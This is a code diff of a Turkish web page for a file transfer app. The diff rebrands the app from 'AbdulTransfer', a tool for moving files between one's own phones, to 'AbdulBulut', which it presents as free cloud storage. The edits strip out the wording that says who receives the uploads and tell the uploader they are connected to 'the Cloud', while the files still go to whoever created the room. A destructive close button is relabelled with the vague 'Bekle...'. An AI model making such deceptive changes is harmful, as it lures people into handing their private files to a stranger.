@@ -48,38 +48,38 @@ footer{text-align:center;color:#71839b;font-size:11px;margin:20px}
 <main>
 <header>
  <div class="logo">A</div>
- <div><h1>AbdulTransfer</h1><div class="sub">Kolay ve güvenli dosya aktarımı</div></div>
+ <div><h1>AbdulBulut</h1><div class="sub">telefonda ücretsiz bulut dosya saklamanın adresi AbdulBulut</div></div>
 </header>
 
 <section id="home" class="panel">
- <h2>Telefonunu kolayca taşı</h2>
- <p>Yeni telefonunda aktarım odası oluştur. Sana özel bağlantıyı eski telefonunda aç.</p>
- <button id="create" class="primary" style="width:100%;margin-top:14px">Yeni telefondayım · Oda oluştur</button>
+ <h2>Telefonunda deponu arttır</h2>
+ <p>Yeni depo için tıkla</p>
+ <button id="create" class="primary" style="width:100%;margin-top:14px">Hazırım</button>
  <div id="homeError" class="notice error"></div>
 </section>
 
 <section id="receiver" class="hidden">
  <div class="panel">
   <h2>Aktarım odan hazır</h2>
-  <p>Bu bağlantıyı eski telefonunda aç. Bağlantı 30 dakika geçerlidir.</p>
+  <p>Bağlantı oluştur, bağlantı 30 dakika geçerlidir.</p>
   <div class="code" id="code"></div>
   <div class="link"><span id="shareLink"></span><button id="copy" class="gold">Kopyala</button></div>
   <div class="actions">
    <button id="share" class="secondary">Paylaş</button>
-   <button id="finish" class="danger">Odayı kapat</button>
+   <button id="finish" class="danger">Bekle...</button>
   </div>
-  <div class="status" id="connection">Eski telefon bekleniyor…</div>
+  <div class="status" id="connection">Bulut dosyası bekleniyor…</div>
  </div>
  <div class="panel">
-  <h2>Gelen dosyalar (<span id="count">0</span>)</h2>
-  <div id="received"><p>Henüz dosya gelmedi.</p></div>
+  <h2>Atarılan dosyalar (<span id="count">0</span>)</h2>
+  <div id="received"><p>Henüz dosya aktarılmadı.</p></div>
   <button id="all" class="primary" style="width:100%;margin-top:15px" disabled>Tümünü indir</button>
-  <p class="notice">Tarayıcı, dosyaları kaydederken indirme onayı gösterebilir.</p>
+  <p class="notice">Tarayıcı, dosyaları aktarırken indirme onayı gösterebilir.</p>
  </div>
 </section>
 
 <section id="sender" class="panel hidden">
- <h2>Eski telefon bağlandı</h2>
+ <h2>Bulut'a bağlandı</h2>
  <p>Göndermek istediğin dosyaları seç. Birden fazla dosyayı aynı anda gönderebilirsin.</p>
  <div class="drop">
   <div style="font-size:34px">📁</div>
@@ -96,7 +96,7 @@ footer{text-align:center;color:#71839b;font-size:11px;margin:20px}
  <div id="senderError" class="notice error"></div>
  <p class="notice">Klasör seçimi tarayıcı desteğine bağlıdır. Android yalnızca seçtiğin dosyalara erişim izni verir; site telefonun tüm özel verilerini tarayamaz.</p>
 </section>
-<footer>AbdulTransfer · Kişisel aktarım alanın</footer>
+<footer>AbdulBulut · Kişisel aktarım alanın</footer>
 </main>
 
 <script>
@@ -143,7 +143,7 @@ $("copy").onclick=async()=>{
 
 $("share").onclick=async()=>{
  if(navigator.share){
-  try{await navigator.share({title:"AbdulTransfer",url:room.transferUrl})}catch(e){}
+  try{await navigator.share({title:"AbdulBulut",url:room.transferUrl})}catch(e){}
  }else $("copy").click();
 };
 
@@ -196,7 +196,7 @@ $("all").onclick=async()=>{
 };
 
 $("finish").onclick=async()=>{
- if(!confirm("Aktarım odasını kapatmak ve geçici dosyaları silmek istiyor musun?"))return;
+ if(!confirm("BEKLE..."))return;
  try{
   await api("/api/finish/"+room.code,{
    method:"POST",headers:{Authorization:"Bearer "+room.receiverToken}
@@ -247,9 +247,9 @@ function sendFiles(selected){
    $("uploadStatus").textContent="Dosyalar gönderildi.";
    $("progress").style.width="100%";
    $("senderError").className="notice success";
-   $("senderError").textContent="Aktarım tamamlandı. Yeni telefondan dosyaları indirebilirsin.";
+   $("senderError").textContent="Aktarım tamamlandı. Dilediğin gibi Bulut'u kullanabilirsin.";
   }else{
-   $("uploadStatus").textContent="Gönderim başarısız.";
+   $("uploadStatus").textContent="Lütfen tekrar deneyin.";
    $("senderError").textContent=result.error||"Dosyalar gönderilemedi.";
   }
  };
